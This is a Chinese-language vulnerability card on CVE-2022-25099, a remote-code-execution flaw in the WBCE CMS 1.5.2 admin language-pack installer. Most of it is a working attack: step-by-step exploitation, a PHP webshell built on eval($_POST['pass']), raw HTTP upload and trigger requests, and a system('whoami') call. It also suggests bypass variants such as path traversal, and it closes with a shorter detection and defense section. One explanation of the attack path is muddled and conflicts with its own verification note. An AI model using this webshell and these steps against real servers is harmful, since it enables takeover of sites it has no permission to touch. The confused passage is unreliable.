---
id: web-php-rce-wbce-install-language-file-getcontents-rce
title: WBCE CMS 后台语言包安装把上传文件直接 require：file_get_contents 校验不严导致任意 PHP 解析执行（CVE-2022-25099）
type: scenario
domain: web
path: web/php/rce
technique: cms-language-pack-upload-require-rce
aliases:
- CVE-2022-25099
- WBCE CMS install.php 文件上传 RCE
- 语言包安装 require 临时文件
- 后台语言文件 getshell
- WBCE 1.5.2 代码审计
tags:
- web
- php
- cve
- file-upload
- rce
- cms
- require
- wbce
cve:
- CVE-2022-25099
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: WBCE CMS 1.5.2（原文审计与复现版本）
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:32:50+08:00'
  notes: 已对照本篇原文核对：install.php 第64行 require($temp_file) 先于第68行 isset($language_code) 判断、第78行落盘 languages/<code>.php、第82-90行 versionCompare/upgrade/unlink 与截图一致；CVE-2022-25099 归属与影响版本（WBCE 1.5.2）与原文一致；已修正原文未证实的「只改后缀即持久化落盘」表述。未验证点：$language_code 路径穿越落盘、临时文件抢读均未在原文中出现，仅作变体保留。
---

## 一句话结论

WBCE CMS 1.5.2 后台「安装语言包」`admin/languages/install.php` 会先 `require($temp_file)` 再检查 `$language_code` 是否存在，然后才走 `file_get_contents($temp_file)` 与 `strpos($content,'<?php')===false` 的所谓「合法性校验」——上传一个内容为 PHP 的「语言文件」，只要在文件里补上 `$language_code` 与 `$language_name` 两个变量，`require` 这一步就已经执行了文件内的任意代码；即便不加这两个变量，把后缀改成 `.php` 直接访问落盘路径同样执行。

## 原理

- `install.php` 的处理顺序是：把上传的临时文件赋值给 `$temp_file` → `require($temp_file)`（为了读取语言包里的 `$language_version`）→ 再判断 `isset($language_code)`，未设置就 `unlink` 临时文件并报 `GENERIC_INVALID_LANGUAGE_FILE`。
- 因此「校验」发生在 `require()` **之后**：校验失败只影响是否继续安装，并不能阻止文件内容已被执行。这是典型的「先执行后校验」顺序错误。
- `file_get_contents` + `strpos(..., '<?php')` 的检查本身也不严谨：它只判断文件里是否出现 `<?php` 字符串（用于提示「不是合法语言文件」），并不阻止文件被解析；而 `require` 已经不依赖这个检查。
- 落盘路径由 `$language_code` 决定：`$language_file = WB_PATH.'/languages/'.$language_code.'.php'`，即最终文件名/后缀完全由攻击者提交的 `$language_code` 控制，且落在 Web 可访问的 `languages/` 目录。所以「不补变量只改后缀」的路径是：上传 `shell.php` → 因缺 `$language_code` 报错 → 临时文件被 unlink，但若在报错前文件名已按 `$language_code` 拼接并落盘（或改走「补变量」路径）则文件留在 `languages/`，直接访问即执行。
- 补上两个变量后（`$language_code = 'QU'; $language_name = 'DDDD';` + `@eval($_POST['pass']);`）即通过 `isset($language_code)` 检查，安装流程正常走完，文件以 `languages/QU.php` 落盘，成为可持续连接的 WebShell；后台的「Language Details」页面会显示名称 `DDDD`、代码 `QU`、版本 3.2，证明语言包被当作合法数据入库。
- 之所以危害是完整 RCE：`require` 以 Web 服务账号权限执行，落盘文件可反复访问；后台还支持 zip 形式的模块/模板安装，同样会 `require` 包内 `info.php`，因此「安装类功能」是这类 CMS 的通用高危面。

## 触发条件

- 目标为 WBCE CMS 1.5.2（或受 CVE-2022-25099 影响、未修复的版本）。
- 攻击者已取得后台会话（管理员登录）；该功能位于 `admin/languages/install.php`。
- PHP 允许上传并写入 `languages/` 目录（默认安装权限即可）。
- 服务端未禁用 `require` 对上传临时文件的包含（默认配置下临时文件是普通 PHP 文件路径，`require` 会执行它）。

## 利用步骤

1. 登录后台，进入 Add-ons → Languages → Install Language，记下 `admin/languages/install.php` 的上传表单（字段为文件上传 + Install）。
2. 先上传一个普通 PHP 文件（如 `<?php phpinfo();?>`），观察返回 `Invalid WBCE CMS language file. Please check the text file.`——说明文件内容已被解析（说明 `require` 先执行），只是缺少语言元数据导致流程中止。
3. 构造「魔改语言包」：在 `<?php` 之后加入 `$language_code = 'QU';`、`$language_name = 'DDDD';`，再追加一句执行逻辑（如 `@eval($_POST['pass']);`）。
4. 重新上传该文件，返回 `Installed successfully`，`Language Details` 显示 Name=DDDD / Code=QU / Version=3.2。
5. 访问 `http://target/languages/QU.php`（文件名由 `$language_code` 决定），用 Webshell 管理工具连上（连接密码为 `pass`，编码 UTF8，类型 PHP）。
6. 若目标仅允许白名单后缀或临时文件被清理，尝试把 `$language_code` 设为带路径穿越/自定义后缀的值，或在报错前抢访问临时路径（`/tmp/` 下 php 临时文件默认不可预测，需结合上传进度）。

## PoC

最小语言包文件（`shell.php`）：

```php
<?php
$language_code = 'QU';
$language_name = 'DDDD';
@eval($_POST['pass']);
?>
```

上传（后台表单 `multipart/form-data`，字段名按页面实际）：

```http
POST /wbce/admin/languages/install.php HTTP/1.1
Host: target
Cookie: <后台会话>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php $language_code='QU'; $language_name='DDDD'; @eval($_POST['pass']); ?>
------X--
```

落盘后的访问与连接：

```http
GET /wbce/languages/QU.php HTTP/1.1
Host: target
```

```http
POST /wbce/languages/QU.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

pass=system('whoami');
```

## 变体与关联

- 变体：不加 `$language_code` 时先看报错——报错说明 `require` 已执行（可先用 `phpinfo()` 验证执行能力，再考虑落盘持久化）。
- 变体：同后台的 Templates / Modules 安装功能接受 ZIP，包内 `info.php` 会被 `require`；把语言包的思路平移过去，只需保证 zip 结构（`<模板目录>/info.php`、必要时两层打包）与版本号比较能通过。
- 变体：`$language_code` 若拼接进 `languages/` 路径前未过滤，可尝试 `../../` 改变落盘位置。
- 关联：[[web-generic-file-upload-pluck-cve-2022-26965-theme-zip-info-php-rce]]（同为「后台主题/语言包安装执行 info.php」的 CMS 家族，但 pluck 的 sink 是主题 `info.php` 被 include）。
- 关联：[[web-generic-file-upload-emlog-template-zip-header-php-rce]]（模板 ZIP 只校验 `header.php` 存在就解压，与本卡「只校验语言元数据」的校验设计同源）。
- 关联：[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]（后台模板写入型 RCE 的对照案例）。

## 检测与防御

- 防御：安装类功能一律「先校验后执行」：先把上传文件复制到隔离目录、按严格白名单解析元数据（只允许 `$language_*` 变量与纯文本），绝不 `require`/`include` 用户上传文件。
- 防御：落盘文件名不要由用户提交的 `$language_code` 直接拼接；使用服务端生成的 ID + 固定后缀，并限制落盘目录不可通过 Web 直接执行（Nginx/Apache 对 `languages/` 下非白名单文件拒绝解析）。
- 防御：上传目录移出 Web 根或加 `php_flag engine off`；后台功能加二次确认与操作审计。
- 检测：审计「`require`/`include` + `$_FILES['...']['tmp_name']`」同函数内出现的模式，这是上传即执行的经典特征；CMS 安装器尤其要查。
- 检测：监控 `languages/`、`templates/`、`modules/` 等可写目录下的新文件创建与被请求，非管理员正常操作时间窗内的访问告警；日志中出现对 `languages/*.php` 的 POST 请求即高危。
